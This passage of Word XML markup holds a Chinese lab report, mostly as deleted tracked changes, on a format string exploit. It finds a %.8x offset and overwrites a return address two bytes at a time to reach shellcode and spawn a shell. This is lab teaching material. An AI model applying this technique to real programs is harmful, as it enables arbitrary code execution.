    <w:p w14:paraId="1E07A511" w14:textId="6766BAA7" w:rsidR="00193C1A" w:rsidDel="0047249A" w:rsidRDefault="00000000" w:rsidP="0047249A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="255"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="840" w:firstLine="420"/>
        <w:rPr>
          <w:del w:id="273" w:author="zhao ruizhi" w:date="2023-05-12T04:53:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="274" w:author="赵睿智" w:date="2023-05-12T12:32:00Z">
        <w:del w:id="275" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
              <w:rPrChange w:id="276" w:author="赵睿智" w:date="2023-05-12T12:33:00Z">
                <w:rPr>
                  <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
                  <w:sz w:val="24"/>
                  <w:lang w:eastAsia="zh-CN"/>
                </w:rPr>
              </w:rPrChange>
            </w:rPr>
            <w:delText>分析：</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="26542D35" w14:textId="22919A04" w:rsidR="00193C1A" w:rsidDel="000D54C7" w:rsidRDefault="00000000" w:rsidP="0047249A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:del w:id="277" w:author="zhao ruizhi" w:date="2023-05-12T04:53:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="278" w:author="赵睿智" w:date="2023-05-12T12:33:00Z">
        <w:del w:id="279" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidRPr="0047249A" w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
              <w:rPrChange w:id="280" w:author="zhao ruizhi" w:date="2023-05-12T04:53:00Z">
                <w:rPr>
                  <w:rFonts w:hint="eastAsia"/>
                  <w:lang w:eastAsia="zh-CN"/>
                </w:rPr>
              </w:rPrChange>
            </w:rPr>
            <w:delText>%</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="281" w:author="赵睿智" w:date="2023-05-12T12:34:00Z">
        <w:del w:id="282" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidRPr="0047249A" w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
              <w:rPrChange w:id="283" w:author="zhao ruizhi" w:date="2023-05-12T04:53:00Z">
                <w:rPr>
                  <w:rFonts w:hint="eastAsia"/>
                  <w:lang w:eastAsia="zh-CN"/>
                </w:rPr>
              </w:rPrChange>
            </w:rPr>
            <w:delText>.8x的填写个数：</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="06570E4B" w14:textId="73164529" w:rsidR="00193C1A" w:rsidDel="000D54C7" w:rsidRDefault="00000000" w:rsidP="000D54C7">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1722" w:firstLine="0"/>
        <w:rPr>
          <w:del w:id="284" w:author="zhao ruizhi" w:date="2023-05-12T04:53:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="285" w:author="赵睿智" w:date="2023-05-12T12:34:00Z">
        <w:del w:id="286" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidRPr="0047249A" w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:rPrChange w:id="287" w:author="zhao ruizhi" w:date="2023-05-12T04:53:00Z">
                <w:rPr>
                  <w:rFonts w:hint="eastAsia"/>
                  <w:lang w:eastAsia="zh-CN"/>
                </w:rPr>
              </w:rPrChange>
            </w:rPr>
            <w:delText>为了找到va_list此时的偏移，得出攻击代码里</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="288" w:author="赵睿智" w:date="2023-05-12T12:35:00Z">
        <w:del w:id="289" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidRPr="0047249A" w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:rPrChange w:id="290" w:author="zhao ruizhi" w:date="2023-05-12T04:53:00Z">
                <w:rPr>
                  <w:rFonts w:hint="eastAsia"/>
                  <w:lang w:eastAsia="zh-CN"/>
                </w:rPr>
              </w:rPrChange>
            </w:rPr>
            <w:delText>需要填几个%.8x，我们通过试错法最终确定填写的数量为15个。</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="54CC0406" w14:textId="44478248" w:rsidR="00193C1A" w:rsidRPr="000D54C7" w:rsidDel="000D54C7" w:rsidRDefault="00000000" w:rsidP="000D54C7">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="291" w:author="赵睿智" w:date="2023-05-12T12:36:00Z"/>
          <w:del w:id="292" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="293" w:author="zhao ruizhi" w:date="2023-05-12T04:54:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:numId w:val="7"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="1282" w:hanging="440"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="294" w:author="赵睿智" w:date="2023-05-12T12:36:00Z">
        <w:del w:id="295" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidRPr="000D54C7" w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
              <w:rPrChange w:id="296" w:author="zhao ruizhi" w:date="2023-05-12T04:53:00Z">
                <w:rPr>
                  <w:rFonts w:hint="eastAsia"/>
                  <w:lang w:eastAsia="zh-CN"/>
                </w:rPr>
              </w:rPrChange>
            </w:rPr>
            <w:delText>addr1,2的确定：</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="31C33D89" w14:textId="3350583E" w:rsidR="00193C1A" w:rsidDel="000D54C7" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="255"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1260" w:firstLine="420"/>
        <w:rPr>
          <w:ins w:id="297" w:author="赵睿智" w:date="2023-05-12T12:42:00Z"/>
          <w:del w:id="298" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="299" w:author="赵睿智" w:date="2023-05-12T12:50:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:numId w:val="7"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="1282" w:hanging="440"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="300" w:author="赵睿智" w:date="2023-05-12T12:36:00Z">
        <w:del w:id="301" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
            <w:delText>由于我们是按照填写</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="302" w:author="赵睿智" w:date="2023-05-12T12:37:00Z">
        <w:del w:id="303" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
            <w:delText>两字节修改方式在返回地址位置填写</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="304" w:author="赵睿智" w:date="2023-05-12T12:38:00Z">
        <w:del w:id="305" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
            <w:delText>恶意脚本的存放位置，而恶意代码存放位置大致为</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="306" w:author="赵睿智" w:date="2023-05-12T12:39:00Z">
        <w:del w:id="307" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
            <w:delText>0xffffcfd4+x，高位0xffff比低位数值大，所以我们需要</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="308" w:author="赵睿智" w:date="2023-05-12T12:40:00Z">
        <w:del w:id="309" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
            <w:delText>先填低字节的位置，由小端</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="310" w:author="赵睿智" w:date="2023-05-12T12:41:00Z">
        <w:del w:id="311" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
            <w:delText xml:space="preserve">存储方式可知低字节位置就是ret addr的起始位置，也就是stack </w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="312" w:author="赵睿智" w:date="2023-05-12T12:42:00Z">
        <w:del w:id="313" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
            <w:delText>frame指针指向的位置上面4个字节处，故：</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2A1C8511" w14:textId="7DC7763F" w:rsidR="00193C1A" w:rsidDel="000D54C7" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="255"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1260" w:firstLine="420"/>
        <w:rPr>
          <w:ins w:id="314" w:author="赵睿智" w:date="2023-05-12T12:42:00Z"/>
          <w:del w:id="315" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="316" w:author="赵睿智" w:date="2023-05-12T12:50:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:numId w:val="7"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="1282" w:hanging="440"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="317" w:author="赵睿智" w:date="2023-05-12T12:42:00Z">
        <w:del w:id="318" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
            <w:delText>addr1 = 0xffffcfb8+4</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="23299DEA" w14:textId="27748C68" w:rsidR="00193C1A" w:rsidDel="000D54C7" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="255"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1260" w:firstLine="420"/>
        <w:rPr>
          <w:ins w:id="319" w:author="赵睿智" w:date="2023-05-12T12:44:00Z"/>
          <w:del w:id="320" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="321" w:author="赵睿智" w:date="2023-05-12T12:50:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:numId w:val="7"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="1282" w:hanging="440"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="322" w:author="赵睿智" w:date="2023-05-12T12:42:00Z">
        <w:del w:id="323" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
            <w:delText>addr2 = addr</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="324" w:author="赵睿智" w:date="2023-05-12T12:43:00Z">
        <w:del w:id="325" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
            <w:delText>1+2</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0E9BF174" w14:textId="39B81CA2" w:rsidR="00193C1A" w:rsidDel="000D54C7" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="7"/>
          <w:ins w:id="326" w:author="赵睿智" w:date="2023-05-12T12:50:00Z"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="2982"/>
        <w:rPr>
          <w:ins w:id="327" w:author="赵睿智" w:date="2023-05-12T12:45:00Z"/>
          <w:del w:id="328" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="329" w:author="赵睿智" w:date="2023-05-12T12:50:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:numId w:val="7"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="1282" w:hanging="440"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="330" w:author="赵睿智" w:date="2023-05-12T12:44:00Z">
        <w:del w:id="331" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
            <w:delText>返回地址</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="332" w:author="赵睿智" w:date="2023-05-12T12:45:00Z">
        <w:del w:id="333" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
            <w:delText>值的确定：</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0F8AA1A5" w14:textId="530C0395" w:rsidR="00193C1A" w:rsidDel="000D54C7" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="255"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1260" w:firstLine="420"/>
        <w:rPr>
          <w:ins w:id="334" w:author="赵睿智" w:date="2023-05-12T12:47:00Z"/>
          <w:del w:id="335" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="336" w:author="赵睿智" w:date="2023-05-12T12:50:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:numId w:val="7"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="1282" w:hanging="440"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="337" w:author="赵睿智" w:date="2023-05-12T12:45:00Z">
        <w:del w:id="338" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
            <w:delText>在实际操作过程中，虽然badfile中被pad填充，但如果pad过长还是会导致</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="339" w:author="赵睿智" w:date="2023-05-12T12:46:00Z">
        <w:del w:id="340" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
            <w:delText>攻击失败，无法调用shell，所以我们选择的最终返回地址要离shellcode近一些。这里选择数组首位置后</w:delText>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="341" w:author="赵睿智" w:date="2023-05-12T12:47:00Z">
        <w:del w:id="342" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
            <w:delText>100字节处，所以返回地址确定为：0xffffcfd4+100</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5467FAC0" w14:textId="7F01F320" w:rsidR="00193C1A" w:rsidDel="000D54C7" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="7"/>
          <w:ins w:id="343" w:author="赵睿智" w:date="2023-05-12T12:50:00Z"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="2982"/>
        <w:rPr>
          <w:ins w:id="344" w:author="赵睿智" w:date="2023-05-12T12:48:00Z"/>
          <w:del w:id="345" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="346" w:author="赵睿智" w:date="2023-05-12T12:50:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:numId w:val="7"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="1282" w:hanging="440"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="347" w:author="赵睿智" w:date="2023-05-12T12:48:00Z">
        <w:del w:id="348" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
            <w:delText>攻击脚本的最终确定：</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="340B805A" w14:textId="09722F40" w:rsidR="00193C1A" w:rsidDel="000D54C7" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="255"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1260" w:firstLine="420"/>
        <w:rPr>
          <w:ins w:id="349" w:author="赵睿智" w:date="2023-05-12T12:48:00Z"/>
          <w:del w:id="350" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="351" w:author="赵睿智" w:date="2023-05-12T12:50:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:numId w:val="7"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="1282" w:hanging="440"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="352" w:author="赵睿智" w:date="2023-05-12T12:48:00Z">
        <w:del w:id="353" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z">
          <w:r w:rsidDel="000D54C7">
            <w:rPr>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:color w:val="FF0000"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
            <w:delText>按照字符串漏洞的相关思想构造即可：</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3847C60D" w14:textId="66B5D19D" w:rsidR="00193C1A" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="255"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1260" w:firstLine="420"/>
        <w:rPr>
          <w:ins w:id="354" w:author="zhao ruizhi" w:date="2023-05-08T16:57:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="355" w:author="赵睿智" w:date="2023-05-12T12:50:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:numId w:val="7"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="1282" w:hanging="440"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="356" w:author="赵睿智" w:date="2023-05-12T12:48:00Z">
        <w:del w:id="357" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z">
          <w:r w:rsidDel="00B2370A">
            <w:rPr>
              <w:rFonts w:cs="Tahoma"/>
              <w:noProof/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="7A6B99D1" wp14:editId="760966EC">
                <wp:extent cx="5266690" cy="1708785"/>
                <wp:effectExtent l="0" t="0" r="10160" b="5715"/>
                <wp:docPr id="6" name="图片 6" descr="截图 2023-05-12 12-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 2023-05-12 12-32-06"/>
                        <pic:cNvPicPr>
                          <a:picLocks noChangeAspect="1"/>
                        </pic:cNvPicPr>
                      </pic:nvPicPr>
                      <pic:blipFill>
                        <a:blip r:embed="rId32"/>
                        <a:srcRect t="49767"/>
                        <a:stretch>
                          <a:fillRect/>
                        </a:stretch>
                      </pic:blipFill>
                      <pic:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="5266690" cy="1708785"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                      </pic:spPr>
                    </pic:pic>
                  </a:graphicData>
                </a:graphic>
              </wp:inline>
            </w:drawing>
          </w:r>
        </w:del>
      </w:ins>
      <w:ins w:id="358" w:author="zhao ruizhi" w:date="2023-05-12T04:58:00Z">
        <w:r w:rsidR="00B2370A">
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="68374F4C" wp14:editId="2CE9F997">
              <wp:extent cx="5266690" cy="1708785"/>
              <wp:effectExtent l="0" t="0" r="10160" b="5715"/>
              <wp:docPr id="275611221" name="图片 275611221" descr="截图 2023-05-12 12-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 2023-05-12 12-32-06"/>
                      <pic:cNvPicPr>
                        <a:picLocks noChangeAspect="1"/>
                      </pic:cNvPicPr>
                    </pic:nvPicPr>
                    <pic:blipFill>
                      <a:blip r:embed="rId32"/>
                      <a:srcRect t="49767"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5266690" cy="1708785"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3485B3E5" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
          <w:ins w:id="359" w:author="赵睿智" w:date="2023-05-12T12:38:00Z"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="360" w:author="zhao ruizhi" w:date="2023-05-08T16:57:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="361" w:author="赵睿智" w:date="2023-05-12T12:38:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="1282" w:firstLine="0"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="362" w:author="zhao ruizhi" w:date="2023-05-08T16:57:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>程序输出结果：</w:t>
        </w:r>
      </w:ins>
    </w:p>
